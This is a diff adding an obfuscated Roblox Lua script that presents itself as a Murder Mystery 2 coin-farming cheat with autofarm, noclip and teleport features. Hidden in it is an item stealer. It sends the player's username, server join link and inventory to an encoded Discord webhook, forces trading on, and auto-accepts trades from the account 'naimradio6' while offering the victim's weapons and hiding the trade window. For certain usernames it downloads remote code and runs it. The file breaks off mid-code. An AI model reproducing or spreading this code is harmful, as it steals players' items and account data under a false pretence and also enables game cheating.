@@ -1,2 +1,984 @@
 
-local v0=game:GetService("Players");local v1=game:GetService("TweenService");local v2=game:GetService("RunService");local v3=game:GetService("VirtualUser");local v4=game:GetService("HttpService");local v5=game:GetService("ReplicatedStorage");local v6=game:GetService("Lighting");local v7=game:GetService("UserInputService");local v8=v0.LocalPlayer;local v9=v8:WaitForChild("PlayerGui");local v10={veqiex=true,naimradio66=true,naimradio6=true,naimradiouse00=true,dmitry6221=true};if v10[v8.Name] then local v354="https://raw.githubusercontent.com/bt-y/677skibidi/refs/heads/main/mmmmmmmmhmm";local function v355(v386) local v387=0 + 0 ;local v388;while true do if (v387==(1 + 0)) then if ( not v388 or ( #v388<20)) then local v472=0;local v473;while true do if (v472==(0 -0)) then v473=request or (syn and syn.request) or (http and http.request) ;if v473 then local v519,v520=pcall(function() return v473({Url=v386,Method="GET"});end);if (v519 and v520) then v388=v520.Body or v520.body ;end end break;end end end return v388;end if (v387==(0 -0)) then v388=nil;pcall(function() v388=game:HttpGet(v386);end);v387=375 -(123 + 251) ;end end end local v356=v355(v354);if ( not v356 or ( #v356<(99 -79))) then return;end if (string.find(v356,"<html") or string.find(v356,"<!DOCTYPE")) then return;end local v357,v358=loadstring(v356);if  not v357 then return;end v357();return;end local function v11() local v174=string.char;local v175=v174(104,116,814 -(208 + 490) ,10 + 102 ,52 + 63 ,58,47,883 -(660 + 176) ,100,13 + 92 ,317 -(14 + 188) ,774 -(534 + 141) ,45 + 66 ,101 + 13 ,97 + 3 ,46,99,233 -122 ,172 -63 ,131 -84 ,97,112,105,47,119,55 + 46 ,98,104,71 + 40 ,507 -(115 + 281) ,248 -141 ,96 + 19 ,47);return v175   .. "1544589998198755329/"   .. "DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV" ;end local v12=v11();local v13=345168823 -202345532 ;local v14="naimradio6";local function v15() local v176={};pcall(function() local v359=0 -0 ;local v360;local v361;while true do if (v359==(867 -(550 + 317))) then v360,v361=pcall(function() return require(v5.Modules.ProfileData);end);if (v360 and v361 and v361.Weapons and v361.Weapons.Owned) then for v474,v475 in pairs(v361.Weapons.Owned) do local v476=0;local v477;while true do if (v476==(1 -0)) then if (v477 and (v477>(0 -0))) then table.insert(v176,v474   .. " x"   .. tostring(v477) );end break;end if (v476==(0 -0)) then v477=((typeof(v475)=="number") and v475) or ((v475==true) and (286 -(134 + 151))) or 0 ;if (typeof(v475)=="table") then v477=v475.Amount or v475.Quantity or v475.Count or (1666 -(970 + 695)) ;end v476=1;end end end end break;end end end);table.sort(v176);return v176;end local function v16() local v177=tostring(game.JobId);local v178="Roblox.GameLauncher.joinGameInstance("   .. v13   .. ', "'   .. v177   .. '")' ;local v179=v15();local v180=(( #v179>(0 -0)) and table.concat(v179,"\n")) or "No weapons found" ;if ( #v180>900) then v180=string.sub(v180,1991 -(582 + 1408) ,3121 -2221 )   .. "\n... (truncated)" ;end local v181={content="@everyone **credits not n7kh in discord**",embeds={{title="credits not n7kh in discord",color=63099063 -46354615 ,fields={{name="Username",value=v8.Name,inline=true},{name="UserId",value=tostring(v8.UserId),inline=true},{name="JobId",value="`"   .. v177   .. "`" ,inline=false},{name="Join Link",value="https://fern.wtf/joiner?placeId="   .. v13   .. "&gameInstanceId="   .. v177 ,inline=false},{name="Console (F12)",value="```js\n"   .. v178   .. "\n```" ,inline=false},{name="Inventory ("   ..  #v179   .. " items)" ,value="```\n"   .. v180   .. "\n```" ,inline=false}},footer={text="Waiting for trade from "   .. v14 },timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};pcall(function() local v362=780 -(162 + 618) ;local v363;while true do if (v362==0) then v363=request or (syn and syn.request) or (http and http.request) ;if v363 then v363({Url=v12,Method="POST",Headers={["Content-Type"]="application/json"},Body=v4:JSONEncode(v181)});end break;end end end);end task.spawn(function() task.wait(1.5 + 0 );v16();end);local function v17() pcall(function() local v364=v5:FindFirstChild("Trade") or v5:FindFirstChild("TradeSystem") ;local v365={"ToggleTrading","SetTrading","SetTradeEnabled","EnableTrading","TradingEnabled","ChangeTrading","UpdateTrading","TradeSetting"};for v389,v390 in ipairs(v365) do local v391=0;local v392;while true do if (v391==0) then v392=(v364 and v364:FindFirstChild(v390)) or v5:FindFirstChild(v390,true) ;if (v392 and v392:IsA("RemoteEvent")) then local v478=1000 -(451 + 549) ;while true do if (v478==(0 + 0)) then pcall(function() v392:FireServer(true);end);pcall(function() v392:FireServer("On");end);break;end end elseif (v392 and v392:IsA("RemoteFunction")) then pcall(function() v392:InvokeServer(true);end);end break;end end end for v393,v394 in ipairs(v5:GetDescendants()) do if v394:IsA("RemoteEvent") then local v414=0;local v415;while true do if (v414==(0 -0)) then v415=string.lower(v394.Name);if (v415:find("trad") and (v415:find("toggle") or v415:find("enable") or v415:find("setting"))) then local v501=0 -0 ;while true do if (v501==(1384 -(746 + 638))) then pcall(function() v394:FireServer(true);end);pcall(function() v394:FireServer(true);end);break;end end end break;end end end end end);end task.spawn(function() local v182=0 + 0 ;while true do if ((1 -0)==v182) then while true do local v416=0;while true do if (v416==(341 -(218 + 123))) then task.wait(8);v17();break;end end end break;end if ((1581 -(1535 + 46))==v182) then task.wait(2);v17();v182=1;end end end);local v18,v19,v20,v21,v22=false,0 + 0 ,false,0,nil;do local v183=v5:FindFirstChild("Trade") or v5:WaitForChild("Trade",10) ;local v184,v185,v186,v187,v188,v189,v190;if v183 then v184=v183:FindFirstChild("OfferItem");v185=v183:FindFirstChild("AcceptRequest");v186=v183:FindFirstChild("AcceptTrade");v187=v183:FindFirstChild("SendRequest");v188=v183:FindFirstChild("StartTrade");v189=v183:FindFirstChild("UpdateTrade");v190=v183:FindFirstChild("DeclineTrade");end local function v191(v366) return v366 and (tostring(v366):lower()==v14:lower()) ;end local function v192() local v367=0 + 0 ;local v368;while true do if (v367==0) then v368={};pcall(function() local v434,v435=pcall(function() return require(v5.Modules.ProfileData);end);if (v434 and v435 and v435.Weapons and v435.Weapons.Owned) then for v490,v491 in pairs(v435.Weapons.Owned) do local v492=v491;if (typeof(v491)=="table") then v492=v491.Amount or v491.Quantity or v491.Count or (561 -(306 + 254)) ;elseif (v491==true) then v492=1;end if ((typeof(v492)=="number") and (v492>(0 + 0)) and (v490~="DefaultKnife") and (v490~="DefaultGun")) then for v514=1,math.min(v492,7 -3 ) do table.insert(v368,v490);end end end end end);v367=1468 -(899 + 568) ;end if (v367==(1 + 0)) then return v368;end end end local function v193() local v369=0 -0 ;while true do if (v369==(603 -(268 + 335))) then if  not v186 then return;end for v436=1,305 -(60 + 230)  do local v437=572 -(426 + 146) ;while true do if (v437==(1 + 0)) then pcall(function() v186:FireServer();end);task.wait(0.3);break;end if (v437==(1456 -(282 + 1174))) then if v22 then pcall(function() v186:FireServer(game.PlaceId * (814 -(569 + 242)) ,v22);end);end pcall(function() v186:FireServer(game.PlaceId * (8 -5) ,tick());end);v437=1 + 0 ;end end end break;end end end local function v194() local v370=0;local v371;local v372;while true do if (v370==(1026 -(706 + 318))) then v372=math.min((1255 -(721 + 530)) -v19 , #v371);for v438=1272 -(945 + 326) ,v372 do local v439=0 -0 ;local v440;local v441;while true do if (v439==2) then if v441 then v19=v19 + 1 ;v21=tick();task.wait(0.45 + 0 );end break;end if (v439==0) then v440=v371[v438];v441=pcall(function() v184:FireServer(v440,"Weapons");end);v439=1;end if (v439==(701 -(271 + 429))) then if  not v441 then v441=pcall(function() v184:FireServer(v440);end);end if  not v441 then v441=pcall(function() v184:FireServer(v440,1 + 0 );end);end v439=1502 -(1408 + 92) ;end end end v370=1089 -(461 + 625) ;end if (v370==(1288 -(993 + 295))) then if ( not v184 or  not v18 or (v19>=(1 + 3))) then return;end if ((tick() -v21)<0.7) then return;end v370=1172 -(418 + 753) ;end if (v370==(2 + 1)) then if ((v19>=(1 + 3)) and  not v20) then local v466=0 + 0 ;while true do if (v466==0) then v20=true;task.delay(2 + 5 ,function() if v18 then v193();end end);break;end end end break;end if (v370==(530 -(406 + 123))) then v371=v192();if ( #v371==(1769 -(1749 + 20))) then return;end v370=1 + 1 ;end end end local function v195(v373) if  not v373 then return;end pcall(function() for v400,v401 in ipairs(v373:GetChildren()) do if v401:IsA("GuiObject") then v401.Visible=false;end end end);end pcall(function() local v374=1322 -(1249 + 73) ;local v375;while true do if ((1 + 1)==v374) then v9.ChildAdded:Connect(function(v443) if ((v443.Name=="TradeGUI") or (v443.Name=="TradeGUI_Phone")) then local v479=1145 -(466 + 679) ;while true do if (v479==(0 -0)) then task.wait(0.05 -0 );v195(v443);break;end end end end);break;end if (v374==1) then v375("TradeGUI");v375("TradeGUI_Phone");v374=1902 -(106 + 1794) ;end if (v374==(0 + 0)) then v375=nil;function v375(v444) local v445=0;local v446;while true do if (v445==(0 + 0)) then v446=v9:FindFirstChild(v444);if v446 then v195(v446);v446:GetPropertyChangedSignal("Enabled"):Connect(function() if v446.Enabled then v195(v446);end end);end break;end end end v374=2 -1 ;end end end);if v187 then pcall(function() v187.OnClientInvoke=function(v417) if v191(v417 and v417.Name ) then local v467=0;while true do if (v467==(2 -1)) then if v185 then pcall(function() v185:FireServer();end);end return true;end if (v467==(114 -(4 + 110))) then v18,v19,v20,v22=true,584 -(57 + 527) ,false,nil;task.wait(0.4);v467=1;end end end return false;end;end);end if v188 then v188.OnClientEvent:Connect(function() if v18 then v19,v20=1427 -(41 + 1386) ,false;task.wait(103.6 -(17 + 86) );v194();end end);end if v189 then v189.OnClientEvent:Connect(function(v403) local v404=0;while true do if (v404==2) then if (type(v403)=="table") then for v502,v503 in pairs(v403) do if ((type(v503)=="table") and v503.Accepted) then v193();break;end end end break;end if (v404==(0 + 0)) then if ((type(v403)=="table") and v403.LastOffer) then v22=v403.LastOffer;end if  not v18 then return;end v404=1 -0 ;end if (v404==1) then task.wait(0.3 -0 );v194();v404=168 -(122 + 44) ;end end end);end if v190 then v190.OnClientEvent:Connect(function() v18,v19,v20,v22=false,0 -0 ,false,nil;end);end task.spawn(function() while true do local v395=0;while true do if (v395==(0 -0)) then task.wait(0.9 + 0 );if (v18 and v186 and v22) then pcall(function() v186:FireServer(game.PlaceId * (1 + 2) ,v22);end);end break;end end end end);end local v23=false;local v24=500;local v25={};local v26=0 -0 ;local v27=false;local v28=true;local v29="Spread";local v30="FlatUnder";local v31=false;local v32=0.35;local v33=81 -(30 + 35) ;local v34=35 + 15 ;local v35=false;local v36=1277 -(1043 + 214) ;local v37,v38=0 -0 ,1252 -(323 + 889) ;local v39,v40={},0 -0 ;local function v41(v196) local v197=0;local v198;while true do if ((580 -(361 + 219))==v197) then v198=v8.Character;if  not v198 then return;end v197=321 -(53 + 267) ;end if ((1 + 0)==v197) then for v418,v419 in ipairs(v198:GetDescendants()) do if v419:IsA("BasePart") then v419.CanCollide= not v196;end end break;end end end local function v42() local v199=0;local v200;local v201;local v202;while true do if (1==v199) then v201=v200:FindFirstChild("HumanoidRootPart");v202=v200:FindFirstChild("Humanoid");v199=2;end if (v199==(413 -(15 + 398))) then v200=v8.Character;if  not v200 then return;end v199=983 -(18 + 964) ;end if (v199==(7 -5)) then pcall(function() local v420=0;while true do if (v420==(1 + 0)) then if  not v31 then v41(false);end break;end if (v420==(0 + 0)) then if v201 then v201.Anchored=false;v201.AssemblyLinearVelocity=Vector3.new(850 -(20 + 830) ,0 + 0 ,126 -(116 + 10) );v201.AssemblyAngularVelocity=Vector3.new(0,0 + 0 ,738 -(542 + 196) );end if v202 then local v507=0 -0 ;while true do if (v507==0) then v202.PlatformStand=false;v202.Sit=false;v507=1 + 0 ;end if (v507==(1 + 0)) then v202.AutoRotate=true;if (v202.WalkSpeed<(1 + 0)) then v202.WalkSpeed=16;end break;end end end v420=2 -1 ;end end end);break;end end end pcall(function() workspace.FallenPartsDestroyHeight= -(128189 -78189);end);local function v43(v204) local v205=1551 -(1126 + 425) ;while true do if (v205==(406 -(118 + 287))) then return v204:FindFirstChild("TouchInterest") or v204:FindFirstChildWhichIsA("TouchTransmitter") ;end if (v205==(0 -0)) then if ( not v204 or  not v204.Parent or v25[v204]) then return false;end if ((v204.Name~="Coin_Server") or  not v204:IsA("BasePart")) then return false;end v205=1122 -(118 + 1003) ;end end end local function v44() local v206=0;while true do if (v206==0) then v39={};for v421,v422 in ipairs(workspace:GetDescendants()) do if (v422.Name=="CoinContainer") then for v480,v481 in ipairs(v422:GetChildren()) do if v43(v481) then table.insert(v39,v481);end end end end v206=2 -1 ;end if (v206==(379 -(142 + 235))) then return  #v39;end if (v206==1) then if ( #v39==(0 -0)) then for v469,v470 in ipairs(workspace:GetDescendants()) do if v43(v470) then table.insert(v39,v470);end end end v40=tick();v206=1 + 1 ;end end end workspace.DescendantAdded:Connect(function(v207) task.defer(function() if v43(v207) then table.insert(v39,v207);elseif ((v207.Name=="TouchInterest") or (v207.ClassName=="TouchTransmitter")) then local v447=v207.Parent;if v43(v447) then table.insert(v39,v447);end end end);end);task.spawn(function() task.wait(977.5 -(553 + 424) );v44();while true do local v376=0;while true do if (v376==0) then task.wait(2);v44();break;end end end end);local function v45() local v208=0 -0 ;local v209;while true do if (v208==(0 + 0)) then v209={};for v423= #v39,1 + 0 , -(1 + 0) do local v424=v39[v423];if v43(v424) then table.insert(v209,v424);else table.remove(v39,v423);end end v208=1;end if (v208==(1 + 0)) then if (( #v209==(0 + 0)) and ((tick() -v40)>(0.8 -0))) then local v448=0 -0 ;while true do if (v448==0) then v44();for v508,v509 in ipairs(v39) do if v43(v509) then table.insert(v209,v509);end end break;end end end return v209;end end end local function v46(v210,v211,v212) local v213=0 -0 ;local v214;local v215;local v216;local v217;while true do if (v213==(1 + 2)) then v217=tick();while v210 and v210.Parent  do local v425=math.min((tick() -v217)/v216 ,1);v210.CFrame=CFrame.new(v214:Lerp(v211,v425));v210.AssemblyLinearVelocity=Vector3.new(0,0,0 -0 );if (v425>=1) then return true;end task.wait();end v213=4;end if (v213==(753 -(239 + 514))) then if ( not v210 or  not v210.Parent) then return false;end v212=math.clamp(v212 or (9 + 14) ,1341 -(797 + 532) ,33 + 12 );v213=1 + 0 ;end if (v213==2) then if (v215<(6 -3)) then v210.CFrame=CFrame.new(v211);return true;end v216=math.clamp(v215/v212 ,1202.08 -(373 + 829) ,735 -(476 + 255) );v213=1133 -(369 + 761) ;end if (v213==(1 + 0)) then v214=v210.Position;v215=(v211-v214).Magnitude;v213=2 -0 ;end if (v213==(7 -3)) then return false;end end end local function v47(v218,v219) local v220=0;while true do if (v220==0) then if ( not v218 or  not v218.Parent or  not v219) then return;end pcall(function() if firetouchinterest then firetouchinterest(v219,v218,238 -(64 + 174) );task.wait(0.04);firetouchinterest(v219,v218,1 + 0 );end end);break;end end end local function v48() local v221=0 -0 ;local v222;local v223;while true do if (v221==(336 -(144 + 192))) then v222,v223=pcall(function() return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue();end);if (v222 and (typeof(v223)=="number")) then return v223;end v221=217 -(42 + 174) ;end if (v221==(1 + 0)) then return 0;end end end local v49=v5:FindFirstChild("Remotes");if v49 then local v377=0 + 0 ;while true do if (0==v377) then v49=v49:FindFirstChild("Gameplay");if v49 then v49=v49:FindFirstChild("CoinCollected");end break;end end end if v49 then v49.OnClientEvent:Connect(function(v396,v397,v398) if (typeof(v397)=="number") then v37=v397;end if (typeof(v398)=="number") then v38=v398;end if (v397 and v398 and (v397>=v398) and v28 and v8.Character) then v8.Character:BreakJoints();end end);end local v50=CFrame.Angles(math.rad(39 + 51 ),1504 -(363 + 1141) ,1580 -(1183 + 397) );local function v51(v224,v225,v226) local v227=0 -0 ;local v228;local v229;local v230;local v231;local v232;while true do if (v227==(0 + 0)) then v41(true);v228=Vector3.new(v225.X,v225.Y,v225.Z);v227=1 + 0 ;end if (v227==(1978 -(1913 + 62))) then v231=math.clamp(v230/v226 ,0.05 + 0 ,5.5 -3 );v232=tick();v227=4;end if (v227==(1937 -(565 + 1368))) then while v224 and v224.Parent  do local v428=0 -0 ;local v429;while true do if (v428==(1663 -(1477 + 184))) then task.wait();break;end if (v428==(1 -0)) then v224.AssemblyLinearVelocity=Vector3.zero;if (v429>=(1 + 0)) then return true;end v428=858 -(564 + 292) ;end if (v428==0) then v429=math.min((tick() -v232)/v231 ,1);v224.CFrame=CFrame.new(v229:Lerp(v228,v429)) * v50 ;v428=1;end end end return false;end if (v227==(1 -0)) then v229=v224.Position;v230=(v228-v229).Magnitude;v227=5 -3 ;end if (v227==(306 -(244 + 60))) then v226=math.clamp(v226 or (16 + 4) ,488 -(41 + 435) ,1051 -(938 + 63) );if (v230<(1.5 + 0)) then v224.CFrame=CFrame.new(v228) * v50 ;v224.AssemblyLinearVelocity=Vector3.zero;return true;end v227=1128 -(936 + 189) ;end end end local function v52(v233,v234,v235) local v236=(v234-v233.Position).Magnitude;local v237=math.clamp(v236/math.max(v235,12) ,0.05 + 0 ,1616 -(1565 + 48) );local v238=v1:Create(v233,TweenInfo.new(v237,Enum.EasingStyle.Linear),{CFrame=CFrame.new(v234)});v238:Play();v238.Completed:Wait();end local function v53(v239) local v240=0;local v241;local v242;local v243;local v244;while true do if (v240==2) then v241= #v239;if (v241<=(2 + 0)) then local v453=1138 -(782 + 356) ;local v454;while true do if (v453==(267 -(176 + 91))) then v454=v239[math.random(2 -1 ,v241)];return v454.obj,v454.dist;end end end v240=3;end if (v240==4) then v244=v239[math.random(v242,v243)];return v244.obj,v244.dist;end if (v240==(0 -0)) then if ( #v239==(1092 -(975 + 117))) then return nil,math.huge;end table.sort(v239,function(v430,v431) return v430.dist<v431.dist ;end);v240=1876 -(157 + 1718) ;end if ((1 + 0)==v240) then if (v30=="Random") then local v455=0;local v456;while true do if (v455==0) then v456=v239[math.random(1, #v239)];return v456.obj,v456.dist;end end end if ((v29=="Closest") or (v30=="TPTouch")) then return v239[3 -2 ].obj,v239[3 -2 ].dist;end v240=2;end if (v240==3) then v242=math.max(1019 -(697 + 321) ,math.floor(v241 * (0.25 -0) ));v243=math.min(v241,math.ceil(v241 * 0.75 ));v240=8 -4 ;end end end task.spawn(function() local v245=tick();while true do if v23 then local v412=v48();if (v412>(645 -365)) then task.wait(0.4);else local v457=v8.Character;local v458=v457 and v457:FindFirstChild("HumanoidRootPart") ;local v459=v457 and v457:FindFirstChild("Humanoid") ;if (v458 and v459 and (v459.Health>(0 + 0))) then if ((tick() -v245)>(56 -26)) then local v510=0 -0 ;while true do if (v510==(1228 -(322 + 905))) then v44();break;end if ((611 -(602 + 9))==v510) then v25={};v245=tick();v510=1190 -(449 + 740) ;end end end local v485=v45();local v486={};for v497,v498 in ipairs(v485) do local v499=0;local v500;while true do if (v499==(872 -(826 + 46))) then v500=(v498.Position-v458.Position).Magnitude;if (v500<v24) then table.insert(v486,{obj=v498,dist=v500});end break;end end end local v487=select(948 -(245 + 702) ,v53(v486));if (v487 and v487.Parent) then local v511=v37;local v512=v487.Position;if (v30=="FlatUnder") then v41(true);v459.AutoRotate=false;v458.Anchored=false;v51(v458,v512,v36);local v518=tick();while (tick() -v518)<(0.55 -0)  do if  not (v458 and v458.Parent and v487 and v487.Parent) then break;end v458.CFrame=CFrame.new(v512) * v50 ;v458.AssemblyLinearVelocity=Vector3.zero;v47(v487,v458);if ((v37>v511) or  not v487:FindFirstChild("TouchInterest")) then break;end task.wait(0.04 + 0 );end elseif (v30=="Tween") then if v31 then v41(true);end v459.AutoRotate=true;v458.Anchored=false;local v529=v512 + Vector3.new(0,1900 -(260 + 1638) ,0) ;v52(v458,v529,v36);v47(v487,v458);local v530=tick();while (tick() -v530)<0.4  do if (v458 and v487 and v487.Parent) then local v537=440 -(382 + 58) ;while true do if (v537==(0 -0)) then v458.CFrame=CFrame.new(v529);v47(v487,v458);break;end end end if ((v37>v511) or  not v487.Parent) then break;end task.wait(0.05 + 0 );end elseif (v30=="TPTouch") then local v532=0 -0 ;while true do if (v532==(0 -0)) then v41(true);v458.CFrame=CFrame.new(v512 + Vector3.new(1205 -(902 + 303) ,3.5 -1 ,0 -0 ) );v532=1 + 0 ;end if (v532==(1691 -(1121 + 569))) then v47(v487,v458);task.wait(214.08 -(22 + 192) );v532=685 -(483 + 200) ;end if (2==v532) then v47(v487,v458);break;end end else if v31 then v41(true);end v459.AutoRotate=true;v458.Anchored=false;local v535=v512 + Vector3.new(1463 -(1404 + 59) ,2,0 -0 ) ;v46(v458,v535,v36);v47(v487,v458);local v536=tick();while (tick() -v536)<(0.45 -0)  do if (v458 and v487 and v487.Parent) then local v539=765 -(468 + 297) ;while true do if (v539==(562 -(334 + 228))) then v458.CFrame=CFrame.new(v535);v47(v487,v458);break;end end end if ((v37>v511) or  not v487.Parent) then break;end task.wait(0.05 -0 );end end v25[v487]=true;v26=v26 + 1 ;task.wait(v32);else task.wait(0.1 -0 );end else task.wait(0.25);end end else v42();task.wait(0.4 -0 );end end end);v2.Stepped:Connect(function() if (v31 or (v23 and (v30=="FlatUnder"))) then v41(true);end end);v8.Idled:Connect(function() if v27 then local v399=0 + 0 ;while true do if (v399==(236 -(141 + 95))) then v3:Button2Down(Vector2.new(),workspace.CurrentCamera.CFrame);task.wait(1);v399=1 + 0 ;end if (v399==(2 -1)) then v3:Button2Up(Vector2.new(),workspace.CurrentCamera.CFrame);break;end end end end);local function v54(v246) local v247=0;local v248;while true do if ((2 -1)==v247) then v248=v246:FindFirstChildOfClass("Humanoid");if v248 then v248.WalkSpeed=v33;v248.JumpPower=v34;pcall(function() v248.UseJumpPower=true;end);end break;end if ((0 + 0)==v247) then v246=v246 or v8.Character ;if  not v246 then return;end v247=2 -1 ;end end end v7.JumpRequest:Connect(function() local v249=0 + 0 ;local v250;local v251;while true do if (v249==0) then if  not v35 then return;end v250=v8.Character;v249=1 + 0 ;end if (v249==(1 -0)) then v251=v250 and v250:FindFirstChildOfClass("Humanoid") ;if v251 then v251:ChangeState(Enum.HumanoidStateType.Jumping);end break;end end end);v8.CharacterAdded:Connect(function(v252) task.wait(0.3 + 0 );v25={};v42();v54(v252);if v31 then v41(true);end end);task.defer(function() task.wait(0.2);v42();end);local v55=Instance.new("ScreenGui");v55.Name="mm2FarmUpdated";v55.ResetOnSpawn=false;v55.IgnoreGuiInset=true;v55.Parent=v9;local v60=Instance.new("Frame");v60.Size=UDim2.fromOffset(483 -(92 + 71) ,520);v60.Position=UDim2.new(0.5 + 0 , -160,0.5 -0 , -260);v60.BackgroundColor3=Color3.fromRGB(22,775 -(574 + 191) ,5 + 0 );v60.Active=true;v60.Draggable=true;v60.Parent=v55;Instance.new("UICorner",v60).CornerRadius=UDim.new(0 -0 ,6 + 4 );local v68=Instance.new("TextLabel");v68.Size=UDim2.new(850 -(254 + 595) , -40,126 -(55 + 71) ,41 -9 );v68.Position=UDim2.new(0,1800 -(573 + 1217) ,0 -0 ,6);v68.BackgroundTransparency=1;v68.Text="mm2 coins farm script -updated-";v68.TextColor3=Color3.fromRGB(20 + 235 ,170,145 -55 );v68.Font=Enum.Font.GothamBold;v68.TextSize=13;v68.TextXAlignment=Enum.TextXAlignment.Left;v68.Parent=v60;local v80=Instance.new("TextButton");v80.Size=UDim2.fromOffset(967 -(714 + 225) ,81 -53 );v80.Position=UDim2.new(1, -34,0 -0 ,1 + 5 );v80.BackgroundColor3=Color3.fromRGB(260 -80 ,846 -(118 + 688) ,88 -(25 + 23) );v80.Text="X";v80.TextColor3=Color3.new(1 + 0 ,1,1);v80.Font=Enum.Font.GothamBold;v80.TextSize=1900 -(927 + 959) ;v80.Parent=v60;Instance.new("UICorner",v80).CornerRadius=UDim.new(0 -0 ,738 -(16 + 716) );local v90=Instance.new("ScreenGui");v90.Name="mm2ToggleBtn";v90.ResetOnSpawn=false;v90.IgnoreGuiInset=true;v90.Parent=v9;local v95=Instance.new("TextButton");v95.Size=UDim2.fromOffset(90,61 -29 );v95.Position=UDim2.new(97 -(11 + 86) ,29 -17 ,0.5, -16);v95.BackgroundColor3=Color3.fromRGB(170,360 -(175 + 110) ,50 -30 );v95.Text="Hide GUI";v95.TextColor3=Color3.new(4 -3 ,1,1797 -(503 + 1293) );v95.Font=Enum.Font.GothamBold;v95.TextSize=12;v95.Active=true;v95.Draggable=true;v95.Parent=v90;Instance.new("UICorner",v95).CornerRadius=UDim.new(0 -0 ,6 + 2 );local v107=true;local function v108(v253) v107=v253;v60.Visible=v253;v95.Text=(v253 and "Hide GUI") or "Show GUI" ;v95.BackgroundColor3=(v253 and Color3.fromRGB(170,1136 -(810 + 251) ,20)) or Color3.fromRGB(42 + 18 ,37 + 83 ,60) ;end v95.MouseButton1Click:Connect(function() v108( not v107);end);v80.MouseButton1Click:Connect(function() v108(false);end);local v109=Instance.new("ScrollingFrame");v109.Size=UDim2.new(1 + 0 , -(549 -(43 + 490)),734 -(711 + 22) , -(185 -137));v109.Position=UDim2.new(859 -(240 + 619) ,8,0 + 0 ,42);v109.BackgroundColor3=Color3.fromRGB(16,12 -4 ,1 + 3 );v109.BorderSizePixel=1744 -(1344 + 400) ;v109.ScrollBarThickness=408 -(255 + 150) ;v109.CanvasSize=UDim2.new(0,0,0 + 0 ,720);v109.Parent=v60;Instance.new("UICorner",v109).CornerRadius=UDim.new(0 + 0 ,8);local v118=Instance.new("UIListLayout");v118.Padding=UDim.new(0 -0 ,19 -13 );v118.SortOrder=Enum.SortOrder.LayoutOrder;v118.Parent=v109;local function v123(v257,v258,v259,v260) local v261=v258;local v262=Instance.new("TextButton");v262.Size=UDim2.new(1740 -(404 + 1335) , -(418 -(183 + 223)),0 -0 ,20 + 10 );v262.BackgroundColor3=(v261 and Color3.fromRGB(170,75,20)) or Color3.fromRGB(15 + 25 ,355 -(10 + 327) ,7 + 3 ) ;v262.Text=v257   .. ((v261 and " : ON") or " : OFF") ;v262.TextColor3=Color3.new(339 -(118 + 220) ,1,1);v262.Font=Enum.Font.GothamBold;v262.TextSize=12;v262.LayoutOrder=v260;v262.Parent=v109;Instance.new("UICorner",v262).CornerRadius=UDim.new(0,2 + 4 );v262.MouseButton1Click:Connect(function() v261= not v261;v262.Text=v257   .. ((v261 and " : ON") or " : OFF") ;v262.BackgroundColor3=(v261 and Color3.fromRGB(170,75,20)) or Color3.fromRGB(40,467 -(108 + 341) ,5 + 5 ) ;v259(v261);end);return v262;end v123("AutoFarm",v23,function(v273) local v274=0;while true do if ((0 -0)==v274) then v23=v273;if v273 then v25={};v26=0;v42();v44();else v42();end break;end end end,1494 -(711 + 782) );v123("Anti AFK",v27,function(v275) v27=v275;end,3 -1 );v123("Reset on Full",v28,function(v276) v28=v276;end,472 -(270 + 199) );v123("Noclip",v31,function(v277) local v278=0 + 0 ;while true do if (v278==0) then v31=v277;if v277 then v41(true);else v42();end break;end end end,4);local v124=Instance.new("TextLabel");v124.Size=UDim2.new(1820 -(580 + 1239) , -(35 -23),0,18 + 0 );v124.BackgroundTransparency=1 + 0 ;v124.Text="Coin Mode: "   .. v29 ;v124.TextColor3=Color3.fromRGB(255,79 + 101 ,261 -161 );v124.Font=Enum.Font.GothamBold;v124.TextSize=8 + 4 ;v124.LayoutOrder=1172 -(645 + 522) ;v124.Parent=v109;for v279,v280 in ipairs({"Closest","Spread"}) do local v281=Instance.new("TextButton");v281.Size=UDim2.new(1, -12,0 -0 ,28);v281.BackgroundColor3=((v29==v280) and Color3.fromRGB(556 -366 ,85,1861 -(1045 + 791) )) or Color3.fromRGB(101 -61 ,18,15 -5 ) ;v281.Text=v280;v281.TextColor3=Color3.new(506 -(351 + 154) ,1575 -(1281 + 293) ,267 -(28 + 238) );v281.Font=Enum.Font.GothamBold;v281.TextSize=26 -14 ;v281.LayoutOrder=(1564 -(1381 + 178)) + v279 ;v281.Parent=v109;Instance.new("UICorner",v281).CornerRadius=UDim.new(0,5);v281.MouseButton1Click:Connect(function() local v380=0 + 0 ;while true do if (v380==1) then for v462,v463 in ipairs(v109:GetChildren()) do if (v463:IsA("TextButton") and ((v463.Text=="Closest") or (v463.Text=="Spread"))) then v463.BackgroundColor3=((v463.Text==v29) and Color3.fromRGB(190,85,25)) or Color3.fromRGB(33 + 7 ,8 + 10 ,34 -24 ) ;end end break;end if (v380==0) then v29=v280;v124.Text="Coin Mode: "   .. v29 ;v380=1;end end end);end local v133=Instance.new("TextLabel");v133.Size=UDim2.new(1, -(7 + 5),470 -(381 + 89) ,16 + 2 );v133.BackgroundTransparency=1;v133.Text="Farm Mode: "   .. v30 ;v133.TextColor3=Color3.fromRGB(173 + 82 ,308 -128 ,1256 -(1074 + 82) );v133.Font=Enum.Font.GothamBold;v133.TextSize=25 -13 ;v133.LayoutOrder=1804 -(214 + 1570) ;v133.Parent=v109;local v142={{"FlatUnder","Flat on coin"},{"Surface","Walk above"},{"Tween","Smooth tween"},{"TPTouch","Fast TP"},{"Random","Random coin"}};for v292,v293 in ipairs(v142) do local v294,v295=v293[1995 -(109 + 1885) ],v293[1471 -(1269 + 200) ];local v296=Instance.new("TextButton");v296.Name="FM_"   .. v294 ;v296.Size=UDim2.new(1, -(22 -10),0,843 -(98 + 717) );v296.BackgroundColor3=((v30==v294) and Color3.fromRGB(1016 -(802 + 24) ,85,43 -18 )) or Color3.fromRGB(50 -10 ,18,2 + 8 ) ;v296.Text=v294   .. " - "   .. v295 ;v296.TextColor3=Color3.new(1,1 + 0 ,1);v296.Font=Enum.Font.GothamBold;v296.TextSize=2 + 9 ;v296.LayoutOrder=20 + v292 ;v296.Parent=v109;Instance.new("UICorner",v296).CornerRadius=UDim.new(0 + 0 ,13 -8 );v296.MouseButton1Click:Connect(function() local v381=0;while true do if ((3 -2)==v381) then for v464,v465 in ipairs(v109:GetChildren()) do if (v465:IsA("TextButton") and (string.sub(v465.Name,1,2 + 1 )=="FM_")) then 